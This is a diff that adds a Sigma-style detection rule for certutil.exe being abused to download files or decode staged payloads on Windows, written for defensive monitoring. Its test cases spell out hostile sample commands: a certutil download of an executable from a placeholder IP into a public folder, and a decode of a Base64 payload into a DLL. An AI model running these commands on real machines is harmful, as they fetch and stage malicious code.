@@ -1,0 +1,38 @@
+title: Certutil Used to Download or Decode a Payload
+id: 4f8a2b6d-7e13-4c09-8d2a-6a1f3e5b9c03
+status: stable
+description: |
+  certutil.exe is a signed Windows binary frequently abused (LOLBin) to
+  download files from the internet or Base64-decode a staged payload.
+author: Vedant Sharma
+tags:
+  - attack.command_and_control
+  - attack.t1105
+  - attack.defense_evasion
+  - attack.t1140
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_img:
+    - Image|endswith: '\certutil.exe'
+    - OriginalFileName: 'CertUtil.exe'
+  selection_download:
+    CommandLine|windash|contains:
+      - '-urlcache'
+      - '-verifyctl'
+  selection_decode:
+    CommandLine|windash|contains: '-decode'
+  condition: selection_img and (selection_download or selection_decode)
+falsepositives:
+  - Administrators refreshing the certificate cache from a known CRL endpoint
+level: high
+tests:
+  match:
+    - Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://203.0.113.50/a.exe C:\Users\Public\a.exe'
+    - Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil /decode payload.b64 payload.dll'
+  no_match:
+    - Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil -hashfile ubuntu.iso SHA256'
